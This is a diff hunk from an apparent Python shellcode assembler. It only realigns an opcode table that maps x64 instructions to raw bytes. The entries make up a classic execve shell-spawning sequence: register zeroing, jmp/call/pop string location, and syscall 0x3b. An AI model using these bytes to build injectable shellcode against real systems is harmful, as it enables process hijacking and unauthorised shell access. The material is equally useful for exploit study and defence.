@@ -28,21 +28,21 @@ ASSEMBLY_CODE = """
 
 # Predefined opcode mappings (simplified for common x64 instructions)
 OPCODE_MAP = {
-    "xor rax,rax": b"\x48\x31\xc0",
-    "xor rdi,rdi": b"\x48\x31\xff",
-    "xor rsi,rsi": b"\x48\x31\xf6",
-    "xor rdx,rdx": b"\x48\x31\xd2",
-    "jmp end":     b"\xeb\x1f",
-    "pop rsi":     b"\x5e",
-    "mov rdi,rsi": b"\x48\x89\xf7",
-    "add rdi,0x7": b"\x48\x83\xc7\x07",
-    "mov rdx,rdi": b"\x48\x89\xfa",
-    "add rdx,0xf": b"\x48\x83\xc2\x0f",
-    "mov rcx,rsi": b"\x48\x89\xf1",
-    "sub rcx,rdi": b"\x48\x29\xf9",
-    "mov al,0x3b": b"\xb0\x3b",
-    "syscall":     b"\x0f\x05",
-    "call loop":   b"\xe8\xdc\xff\xff\xff",
+    "xor rax,rax":          b"\x48\x31\xc0",
+    "xor rdi,rdi":          b"\x48\x31\xff",
+    "xor rsi,rsi":          b"\x48\x31\xf6",
+    "xor rdx,rdx":          b"\x48\x31\xd2",
+    "jmp end":              b"\xeb\x1f",
+    "pop rsi":              b"\x5e",
+    "mov rdi,rsi":          b"\x48\x89\xf7",
+    "add rdi,0x7":          b"\x48\x83\xc7\x07",
+    "mov rdx,rdi":          b"\x48\x89\xfa",
+    "add rdx,0xf":          b"\x48\x83\xc2\x0f",
+    "mov rcx,rsi":          b"\x48\x89\xf1",
+    "sub rcx,rdi":          b"\x48\x29\xf9",
+    "mov al,0x3b":          b"\xb0\x3b",
+    "syscall":              b"\x0f\x05",
+    "call loop":            b"\xe8\xdc\xff\xff\xff",
 }
 
 # Configuration
